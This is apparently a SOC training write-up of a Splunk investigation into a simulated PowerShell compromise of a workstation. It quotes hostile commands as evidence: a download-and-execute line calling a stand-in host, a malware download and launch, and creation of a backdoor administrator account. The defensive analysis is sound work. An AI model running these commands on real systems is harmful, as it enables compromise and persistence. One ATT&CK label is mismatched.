## Executive Summary
A sophisticated PowerShell-based attack was detected on workstation WKSTN-04 
at SecureCore Ltd. The attacker used encoded commands to hide malicious 
activity, created a hidden administrator backdoor account, downloaded and 
executed malware from an external server, and conducted post-exploitation 
reconnaissance — representing a critical severity incident with potential 
for full network compromise.

---

## Scenario
It is Wednesday morning at SecureCore Ltd. The SIEM fires an alert — 
"Suspicious PowerShell execution detected on workstation WKSTN-04." The 
alert shows PowerShell was launched with encoded parameters from an unusual 
parent process. A SOC analyst is tasked with investigating whether this is 
a legitimate administrator running a script or an attacker using PowerShell 
to compromise the system.

The analyst has access to Windows PowerShell execution logs ingested into 
Splunk and must identify all malicious commands, determine the full scope 
of the attack, and document findings professionally.

## Objective
Investigate suspicious PowerShell execution logs using Splunk, identify 
malicious commands and techniques, determine the full scope of the attack, 
and document all findings professionally.

## Tools Used
- Splunk Enterprise
- SPL (Search Processing Language)

## Dataset
- File: powershell-logs.csv
- Index: main
- Total Events: 16
- Log Fields: time, host, user, src_ip, process, parent_process, 
  command_line, encoded, EventCode, status, description

---

## Background — Why Attackers Abuse PowerShell

PowerShell is a legitimate Windows administration tool pre-installed on 
every Windows machine. Attackers abuse it because:

- It is already trusted by the operating system
- It can download files, execute code and manage systems
- Commands can be encoded in Base64 to hide their true purpose
- Activity can blend in with legitimate administrator behaviour

**Key red flags in PowerShell investigations:**

| Red Flag | What it means |
|----------|--------------|
| Parent process is cmd.exe | Someone used command prompt to launch PowerShell — unusual for normal users |
| encoded=true | Command was deliberately scrambled to hide its purpose |
| Invoke-WebRequest | PowerShell downloading something from the internet |
| New-LocalUser | A new user account being created |
| Add-LocalGroupMember | Adding a user to a privileged group |

---

## Investigation Steps

### Step 1 — Load and Review Raw Logs
The dataset was loaded into Splunk and raw logs were reviewed first to 
understand the full scope of PowerShell activity across the environment.

**Query used:**
```
index=main source="powershell-logs.csv"
```

**Why this query:**
Always begin with raw unfiltered data. This establishes your baseline — 
understanding what normal PowerShell activity looks like in this 
environment before identifying what is abnormal.

**What to look for:**
Total event count, which workstations are involved, which users are 
running PowerShell, and whether any fields immediately stand out such 
as encoded or parent_process.

**Finding:**
16 total PowerShell events were present. Initial review revealed activity 
across multiple workstations — WKSTN-01, WKSTN-02, WKSTN-03 and WKSTN-04. 
Most activity appeared normal but WKSTN-04 immediately stood out due to 
its parent process and encoded command fields.

![Figure 1 — Raw log overview showing 16 PowerShell events across 
multiple workstations](screenshots/01-raw-logs.png)

**Figure 1** confirms the dataset was successfully loaded with all fields 
correctly parsed. The variety of workstations and users provides important 
baseline context for identifying anomalies.

---

### Step 2 — Full Dataset Overview
All events were organised into a clean structured table to compare 
normal versus suspicious PowerShell activity across the environment.

**Query used:**
```
index=main source="powershell-logs.csv"
| table time, user, extracted_host, parent_process, command_line, 
  encoded, status, description
| sort time
```

**Why this query:**
The `table` command presents all key fields side by side making it easy 
to compare activity across workstations. Including the `encoded` and 
`parent_process` fields in the table immediately highlights anomalies 
that would otherwise require multiple separate queries to find.

**What pattern to expect:**
Normal PowerShell activity shows explorer.exe as the parent process with 
readable command lines and encoded=false. Malicious activity shows 
cmd.exe as the parent with encoded=true and suspicious command lines.

**Finding:**
The table immediately revealed a clear split between normal and suspicious 
activity. WKSTN-01, WKSTN-02 and WKSTN-03 showed PowerShell launched from 
explorer.exe with readable commands — normal behaviour. WKSTN-04 showed 
PowerShell launched exclusively from cmd.exe with encoded commands and 
highly suspicious activity — a clear anomaly requiring immediate 
investigation.

![Figure 2 — Full dataset table showing normal activity on other 
workstations contrasted against suspicious cmd.exe launched encoded 
commands on WKSTN-04](screenshots/02-full-table-overview.png)

**Figure 2** makes the contrast between normal and malicious PowerShell 
activity immediately visible. Every suspicious event is concentrated on 
WKSTN-04 with cmd.exe as the parent process.

---

### Step 3 — Isolate WKSTN-04 Activity
All activity on the compromised workstation was isolated to reconstruct 
the complete attack sequence in chronological order.

**Query used:**
```
index=main source="powershell-logs.csv" extracted_host=WKSTN-04
| table time, user, parent_process, command_line, description
| sort time
```

**Why this query:**
Filtering by a specific host isolates all activity on that machine 
regardless of other filter criteria. Sorting by time reconstructs the 
exact sequence of events — critical for understanding how the attack 
progressed from initial access through to post-exploitation.

**What pattern to expect:**
A structured attack follows a clear lifecycle — initial access, execution, 
persistence, then reconnaissance. The commands should tell a coherent 
story when read in chronological order.

**Finding:**
10 PowerShell events were recorded on WKSTN-04 between 09:20 and 09:45. 
All events were executed by the admin account with cmd.exe as the parent 
process. Reading the commands chronologically revealed a structured and 
deliberate attack following the classic attack lifecycle.

![Figure 3 — Complete WKSTN-04 activity timeline showing 10 events 
from encoded command execution through to post-exploitation 
reconnaissance](screenshots/03-wkstn04-full-activity.png)

**Figure 3** shows the complete attack sequence on WKSTN-04 in 
chronological order. The progression from encoded commands to backdoor 
creation to malware execution is clearly visible.

---

### Step 4 — Detect Encoded PowerShell Commands
Encoded PowerShell commands were isolated to identify deliberate attempts 
to hide malicious activity from security monitoring tools.

**Query used:**
```
index=main source="powershell-logs.csv" encoded=true
| table time, user, extracted_host, parent_process, command_line, 
  description
| sort time
```

**Why this query:**
Filtering `encoded=true` specifically targets commands that were 
deliberately obfuscated. Legitimate administrators very rarely need to 
encode PowerShell commands — encoded commands in an environment are 
almost always malicious. This query is a high-fidelity detection rule 
used in real SOC environments.

**What pattern to expect:**
Encoded commands appear as long strings of random-looking characters. 
Multiple encoded commands in quick succession suggest an automated 
attack tool running a payload delivery sequence.

**Finding:**
3 encoded PowerShell commands were executed on WKSTN-04 between 09:20 
and 09:22 — all from cmd.exe. The encoded strings translate to:
```
IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload')
```

This command downloads malicious code from a remote server and executes 
it directly in memory — a fileless attack technique designed to evade 
antivirus detection.

![Figure 4 — Three encoded PowerShell commands executed in quick 
succession from cmd.exe on WKSTN-04](screenshots/04-encoded-commands.png)

**Figure 4** confirms that 3 deliberately obfuscated commands were 
executed within 2 minutes — consistent with an automated payload 
delivery tool rather than manual administrator activity.

---

### Step 5 — Backdoor Account Creation
Commands containing backdoor-related activity were isolated to identify 
persistence mechanisms established by the attacker.

**Query used:**
```
index=main source="powershell-logs.csv" command_line="*backdoor*"
| table time, user, extracted_host, command_line, description
| sort time
```

**Why this query:**
The `*` wildcard matches any text before or after the search term — so 
this finds any command containing the word backdoor regardless of the 
full command structure. Persistence detection is critical because it 
determines whether the attacker can return even after remediation.

**What pattern to expect:**
Attackers typically create a new account and immediately elevate its 
privileges in two sequential commands — account creation followed by 
group membership addition.

**Finding:**
Two critical persistence commands were identified:

| Time | Command | Purpose |
|------|---------|---------|
| 09:23 | New-LocalUser -Name backdoor -Password P@ssw0rd123 | Hidden local account created |
| 09:25 | Add-LocalGroupMember -Group Administrators -Member backdoor | Full admin privileges granted |

The attacker created a hidden account named "backdoor" and immediately 
elevated it to administrator level. This ensures continued access even 
if the original compromise is discovered and the admin password is reset.

![Figure 5 — Backdoor account creation and privilege escalation commands 
executed at 09:23 and 09:25](screenshots/05-backdoor-creation.png)

**Figure 5** confirms the two-step persistence mechanism — account 
creation immediately followed by administrator privilege assignment — 
a classic attacker persistence technique.

---

### Step 6 — Malware Download and Execution
Commands involving the malicious payload were isolated to confirm malware 
deployment on the compromised system.

**Query used:**
```
index=main source="powershell-logs.csv" command_line="*payload.exe*"
| table time, user, extracted_host, command_line, description
| sort time
```

**Why this query:**
Searching for the payload filename identifies both the download and 
execution events in one query. This confirms the full malware deployment 
cycle — download, save and execute — proving the system is actively 
compromised rather than just targeted.

**What pattern to expect:**
Malware deployment follows a two-step pattern — first a download command 
saves the file to disk, then an execution command launches it. The save 
location often reveals attacker tradecraft.

**Finding:**

| Time | Command | Action |
|------|---------|--------|
| 09:27 | Invoke-WebRequest -Uri http://malicious.site/payload.exe -OutFile C:\Windows\Temp\payload.exe | Malware downloaded |
| 09:30 | Start-Process C:\Windows\Temp\payload.exe | Malware executed |

The attacker saved the malware to C:\Windows\Temp\ — a classic technique 
as this folder is writable by all users and frequently overlooked by 
security tools. The malware was then executed confirming full compromise 
of WKSTN-04.

![Figure 6 — Malware download from external server and execution 
confirmed at 09:27 and 09:30](screenshots/06-malware-download-execution.png)

**Figure 6** confirms the complete malware deployment cycle — download 
from an external malicious server followed by local execution. The 
C:\Windows\Temp\ save location indicates deliberate attacker tradecraft.

---

## Attack Timeline

| Time | Event |
|------|-------|
| 09:20:00 | First encoded PowerShell command executed via cmd.exe |
| 09:21:00 | Second encoded command executed |
| 09:22:00 | Third encoded command executed |
| 09:23:00 | ⚠️ Backdoor user account created |
| 09:25:00 | ⚠️ Backdoor account added to Administrators group |
| 09:27:00 | ⚠️ Malware downloaded from http://malicious.site/payload.exe |
| 09:30:00 | ⚠️ Malware executed from C:\Windows\Temp\ |
| 09:35:00 | Attacker enumerates local users |
| 09:40:00 | Attacker maps network configuration |
| 09:45:00 | Attacker enumerates running processes |

---

## Findings Summary

| Finding | Detail |
|---------|--------|
| Compromised machine | WKSTN-04 |
| Attacker user context | admin |
| Attack start time | 2026-04-08 09:20:00 |
| Entry technique | Encoded PowerShell via cmd.exe |
| Encoded commands executed | 3 |
| Backdoor account created | "backdoor" |
| Backdoor privileges | Administrator |
| Malware source | http://malicious.site/payload.exe |
| Malware saved to | C:\Windows\Temp\payload.exe |
| Malware executed | Confirmed at 09:30 |
| Post-exploitation | User enumeration, network recon, process enumeration |
| Weakness exploited | No PowerShell execution restrictions or monitoring |

---

## MITRE ATT&CK Mapping

| Technique | ID | Explanation |
|-----------|-----|-------------|
| PowerShell | T1059.001 | The attacker used PowerShell as their primary attack tool — abusing a legitimate Windows feature to avoid detection |
| Obfuscated Files or Information | T1027 | Commands were Base64 encoded to hide their true purpose from security tools and analysts |
| Create Local Account | T1136.001 | A hidden local account named "backdoor" was created to maintain persistent access even after the initial compromise is discovered |
| Ingress Tool Transfer | T1105 | Malware was downloaded from an external server using Invoke-WebRequest — a built-in PowerShell tool |
| System Information Discovery | T1082 | After deploying malware the attacker enumerated users, network configuration and running processes to understand the environment |
| Process Injection via cmd.exe | T1059.003 | PowerShell was launched from cmd.exe rather than directly — a process chaining technique used to obscure the attack origin |

---

## Conclusion
This investigation confirmed a sophisticated and structured PowerShell-based 
attack against WKSTN-04 at SecureCore Ltd. The attacker demonstrated 
advanced tradecraft — using encoded commands to bypass security monitoring, 
launching PowerShell from cmd.exe to obscure the attack origin, and saving 
malware to C:\Windows\Temp\ to evade detection.

The attack followed a deliberate lifecycle — initial access via encoded 
commands, persistence through a hidden administrator account, malware 
deployment from an external server, and post-exploitation reconnaissance 
to prepare for further network penetration.

The primary weakness exploited was the absence of PowerShell execution 
restrictions and monitoring. Had PowerShell script block logging been 
enabled, the encoded commands would have been automatically decoded and 
logged — making detection immediate rather than requiring manual 
investigation.

The creation of a backdoor administrator account means that simply 
resetting the admin password is insufficient for remediation — the 
backdoor account must be identified and removed or the attacker retains 
persistent access regardless of other remediation steps.

## Recommended Actions
- Immediately isolate WKSTN-04 from the network
- Disable and delete the backdoor local account immediately
- Block http://malicious.site at the firewall level
- Search all other machines for payload.exe in C:\Windows\Temp\
- Reset admin account credentials across all systems
- Enable PowerShell script block logging across the entire environment
- Implement Constrained Language Mode for PowerShell
- Create SIEM alert for any encoded PowerShell execution
- Create SIEM alert for PowerShell launched from cmd.exe
- Conduct full forensic investigation of WKSTN-04
